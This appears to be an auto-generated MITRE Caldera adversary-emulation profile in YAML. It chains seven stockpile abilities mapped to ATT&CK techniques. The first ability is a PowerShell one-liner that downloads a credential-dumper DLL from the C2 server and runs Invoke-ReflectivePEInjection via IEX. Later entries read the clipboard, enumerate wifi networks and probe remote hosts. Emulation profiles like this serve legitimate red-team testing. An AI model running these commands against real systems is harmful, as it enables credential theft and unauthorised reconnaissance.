adversary_id: custom_adversary_profile__None__None__stockpile__2023-10-19-22_46_45
name: Custom Adversary Profile
description: None
atomic_ordering:
- c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7 # ('c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7', 'None', 'None') ; {'description': 'Injects cred dumper exe into an available process', 'tactic': 'credential-access', 'technique': {'attack_id': 'T1055.002', 'name': 'Process Injection: Portable Executable Injection'}, 'platforms': {'windows': {'psh': {'command': '$url="#{server}/file/download";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add("file","debugger.dll");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose'}}}, 'id__dependence__fact': ['c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7', 'None', 'None'], 'plugin': 'stockpile'}
- b18e8767-b7ea-41a3-8e80-baf65a5ddef5 # ('b18e8767-b7ea-41a3-8e80-baf65a5ddef5', 'None', 'None') ; {'description': 'Check to see what version of python is installed', 'tactic': 'discovery', 'technique': {'attack_id': 'T1518', 'name': 'Software Discovery'}, 'platforms': {'darwin': {'sh': {'command': 'python3 --version;python2 --version;python --version\n'}}, 'linux': {'sh': {'command': 'python3 --version;python2 --version;python --version\n'}}, 'windows': {'cmd': {'command': 'python3 --version&python2 --version&python --version\n'}}}, 'id__dependence__fact': ['b18e8767-b7ea-41a3-8e80-baf65a5ddef5', 'None', 'None'], 'plugin': 'stockpile'}
- a0676fe1-cd52-482e-8dde-349b73f9aa69 # ('a0676fe1-cd52-482e-8dde-349b73f9aa69', 'None', 'wifi.network.ssid') ; {'description': 'See the most used WIFI networks of a machine', 'tactic': 'discovery', 'technique': {'attack_id': 'T1016', 'name': 'System Network Configuration Discovery'}, 'platforms': {'darwin': {'sh': {'command': './wifi.sh pref\n', 'payloads': ['wifi.sh'], 'parsers': {'plugins.stockpile.app.parsers.wifipref': [{'source': 'wifi.network.ssid'}]}}}, 'linux': {'sh': {'command': './wifi.sh pref\n', 'payloads': ['wifi.sh'], 'parsers': {'plugins.stockpile.app.parsers.wifipref': [{'source': 'wifi.network.ssid'}]}}}, 'windows': {'psh': {'command': '.\\wifi.ps1 -Pref\n', 'payloads': ['wifi.ps1'], 'parsers': {'plugins.stockpile.app.parsers.wifipref': [{'source': 'wifi.network.ssid'}]}}}}, 'id__dependence__fact': ['a0676fe1-cd52-482e-8dde-349b73f9aa69', 'None', 'wifi.network.ssid'], 'plugin': 'stockpile'}
- b007fe0c-c6b0-4fda-915c-255bbc070de2 # ('b007fe0c-c6b0-4fda-915c-255bbc070de2', 'None', 'None') ; {'description': 'copy the contents for the clipboard and print them', 'tactic': 'collection', 'technique': {'attack_id': 'T1115', 'name': 'Clipboard Data'}, 'platforms': {'darwin': {'sh': {'command': 'pbpaste\n'}}, 'windows': {'psh,pwsh': {'command': 'Get-Clipboard -raw\n'}}, 'linux': {'sh': {'command': 'xclip -o\n'}}}, 'id__dependence__fact': ['b007fe0c-c6b0-4fda-915c-255bbc070de2', 'None', 'None'], 'plugin': 'stockpile'}
- fa6e8607-e0b1-425d-8924-9b894da5a002 # ('fa6e8607-e0b1-425d-8924-9b894da5a002', 'None', 'host.current.time') ; {'description': 'get current system time (ISO 8601)', 'tactic': 'discovery', 'technique': {'attack_id': 'T1124', 'name': 'System Time Discovery'}, 'platforms': {'darwin': {'sh': {'command': 'date -u +"%Y-%m-%dT%H:%M:%SZ"\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.current.time'}]}}}, 'linux': {'sh': {'command': 'date -u +"%Y-%m-%dT%H:%M:%SZ"\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.current.time'}]}}}, 'windows': {'psh': {'command': "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n", 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.current.time'}]}}}}, 'id__dependence__fact': ['fa6e8607-e0b1-425d-8924-9b894da5a002', 'None', 'host.current.time'], 'plugin': 'stockpile'}
- 29451844-9b76-4e16-a9ee-d6feab4b24db # ('29451844-9b76-4e16-a9ee-d6feab4b24db', 'None', 'None') ; {'description': 'Discover the PowerShell version', 'tactic': 'discovery', 'technique': {'attack_id': 'T1082', 'name': 'System Information Discovery'}, 'platforms': {'windows': {'psh,pwsh': {'command': '$PSVersionTable\n'}}}, 'id__dependence__fact': ['29451844-9b76-4e16-a9ee-d6feab4b24db', 'None', 'None'], 'plugin': 'stockpile'}
- fdf8bf36-797f-4157-805b-fe7c1c6fc903 # ('fdf8bf36-797f-4157-805b-fe7c1c6fc903', 'None', 'None') ; {'description': 'Find hostname of remote host', 'tactic': 'discovery', 'technique': {'attack_id': 'T1018', 'name': 'Remote System Discovery'}, 'platforms': {'windows': {'psh': {'command': 'nbtstat -A #{remote.host.ip}'}}}, 'id__dependence__fact': ['fdf8bf36-797f-4157-805b-fe7c1c6fc903', 'None', 'None'], 'plugin': 'stockpile'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []